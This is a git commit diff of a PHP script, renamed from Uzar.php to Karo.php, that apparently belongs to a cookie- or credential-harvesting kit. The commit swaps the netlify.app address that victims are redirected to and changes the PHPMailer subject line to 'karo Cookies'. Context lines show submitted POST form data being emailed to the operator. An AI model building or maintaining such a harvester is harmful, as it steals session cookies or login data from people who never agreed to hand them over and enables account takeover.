6411f3b62fe4c1a8c2638375132219cd907849c9
Uzar33921 <tiktokworkingsteam@gmail.com>
2025-08-04 10:51:48 +0500

    Update and rename Uzar.php to Karo.php

--- Karo.php
+++ Karo.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://incomparable-marzipan-3d8da9.netlify.app/");
+header("Location: https://prismatic-tanuki-4cc59b.netlify.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
@@ -44,7 +44,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'uzar Cookies';
+        $mail->Subject = 'karo Cookies';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
